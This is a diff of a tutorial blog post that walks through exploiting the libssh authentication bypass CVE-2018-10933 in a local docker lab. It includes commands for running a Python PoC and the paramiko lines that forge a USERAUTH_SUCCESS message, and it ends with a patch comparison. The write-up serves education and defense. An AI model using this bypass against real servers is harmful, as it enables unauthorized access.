@@ -20,8 +20,8 @@ link:https://www.libssh.org/security/advisories/CVE-2018-10933.txt[CVE-2018-1093
 resides on the server code
 which can enable a client to bypass the authentication process
 and create channels without permissions,
-this affects servers using versions 0.6 and above
-being used in server mode
+this affects servers using versions +0.6+ and above
+being used in server mode.
 
 The bug was discovered by Peter Winter-Smith of NCC Group,
 it's like a +jedi+ trick:
@@ -46,13 +46,13 @@ It's a +C+ library to implement +SSHv2+ protocol
 on client and server side,
 so first of all we need to write our server side code,
 we are going to use the sample that +LibSSH+ has (+samplesshd-cb.c+)
-and modify it for our purposes
+and modify it for our purposes.
 
 In the +ssh_channel_callbacks_struct+
 we are going to put the following line
-in order to have the +exec+ functionality
+in order to have the +exec+ functionality:
 
-.exec
+.exec request
 [source,C]
 ----
 .channel_exec_request_function = exec_request
@@ -62,7 +62,7 @@ image::channel-exec.png[channel-exec]
 
 
 Next, add the +exec_request+ function,
-this will take our commands and execute them on the server
+this will take our commands and execute them on the server:
 
 [source,C]
 ----
@@ -88,7 +88,7 @@ static int exec_request(ssh_session session, ssh_channel channel,
 
 If you have +LibSSH+ with version +0.7.4+
 you can simply save it, compile it and execute it,
-if not you can use the our method.
+if not you can use our method.
 we are going to use a +docker+ container
 and install both versions,
 a vulnerable one and a patched one,
@@ -101,67 +101,79 @@ and run this command:
 
 [source,bash]
 ----
-docker build -t fluidattackscve201810933 .
+host$ docker build -t fluidattackscve201810933 .
 ----
 
 This will download all the necessary files
-and compile all the sources of +LibSSH+
+and compile all the sources of +LibSSH+.
 
 Then, to open the container
-simply run this command
+simply run this command:
 
 [source,bash]
 ----
-docker run -it -p 2222:2222 fluidattackscve201810933:latest /bin/bash
+host$ docker run -it -p 2222:2222 fluidattackscve201810933:latest /bin/bash
 ----
 
 This is going to mirror our +port 2222+ to the container +port 2222+
 in order to be able to run our tests,
 also it will open a +bash terminal+ on the container machine,
-here we will run our +LibSSH+ server
+here we will run our +LibSSH+ server.
 
 == Exploiting the vulnerability
 
 
 In this case we are going to use +LibSSH v0.7.4+
 and test the solution with +LibSSH v0.7.6+,
-the PoC is on +Python+
+the PoC is on +Python+ version 2
 and you can check its source
 link:https://www.openwall.com/lists/oss-security/2018/10/17/5[here],
 but if you downloaded our files
-its there as +exploit.py+
+its there as +exploit.py+.
 
-In the container run the following command
-to start the vulnerable +LibSSH+ server
+In order to run this PoC
+you will need +paramiko+,
+you can install it by running:
 
 [source,bash]
 ----
-./tmp/libssh-0.7.4/build/examples/samplesshd-cb -k ~/.ssh/id_dsa 0.0.0.0 -k ~/.ssh/id_rsa -p 2222 --verbose
+host$ pip install paramiko
 ----
 
-The verbose flag is to see what is sending and receiving our server
+In the container run the following command
+to start the vulnerable +LibSSH+ server:
+
+[source,bash]
+----
+container$ ./tmp/libssh-0.7.4/build/examples/samplesshd-cb -k ~/.ssh/id_dsa 0.0.0.0 -k ~/.ssh/id_rsa -p 2222 --verbose
+----
+
+The verbose flag is to see what is sending and receiving our server.
 
 Then in your machine run the exploit with:
 
 [source,bash]
 ----
-python exploit.py
+host$ python exploit.py
 ----
 
 If you check your container
-you can see this
+you can see this:
 
 image::ssh-bypass.png[ssh-bypass]
 
 When the server is expecting the +SSH2_MSG_USERAUTH_REQUEST+
 we are sending an +SSH2_MSG_USERAUTH_SUCCESS+
 
-image::exploit-message.png[exploit-message]
-
+[source,python]
+----
+m.add_byte(paramiko.common.cMSG_USERAUTH_SUCCESS)
+transport._send_message(m)
+----
 
 The server accepts it
 and we bypassed the authentication.
-Then we can send our commands to the server with
+Then we can send our commands to the server with:
 
 [source,python]
 ----
@@ -177,16 +189,19 @@ image::dont-work.png[dont-work]
 The +LibSSH+ version +0.7.6+ don't have this vulnerability
 and we can test it too
 in our container,
-we just need to run
+we just need to run:
 
 [source,bash]
 ----
-./tmp/libssh-0.7.6/build/examples/samplesshd-cb -k ~/.ssh/id_dsa 0.0.0.0 -k ~/.ssh/id_rsa -p 2222 --verbose
+container$ ./tmp/libssh-0.7.6/build/examples/samplesshd-cb -k ~/.ssh/id_dsa 0.0.0.0 -k ~/.ssh/id_rsa -p 2222 --verbose
 ----
 
-And on our machine the exploit again
+And on our machine the exploit again:
 
-image::exploit-no.png[exploit-no]
+[source,bash]
+----
+host$ python exploit.py
+----
 
 image::no-vulnerable.png[no-vulnerable]
 
@@ -198,13 +213,21 @@ because they added a validation on their code,
 when the packet is +SSH2_MSG_USERAUTH_SUCCESS+
 then its checks for the authentication state
 and if it is not one of the valid states
-it denies the packet
+it denies the packet.
 
+.Code on src/packet.c
 image::solution.png[solution]
 
 Here you can see the difference of responses
 between a vulnerable version
-and a non vulnerable one
+and a non vulnerable one.
 
+.Vulnerable
 image::vulnerable.png[vulnerable]
+
+.No vulnerable
 image::no-vulnerable.png[no-vulnerable2]
+
+If you have +LibSSH+ in your server
+and you are using a server component,
+you should install the updated or the patched versions of +LibSSH+
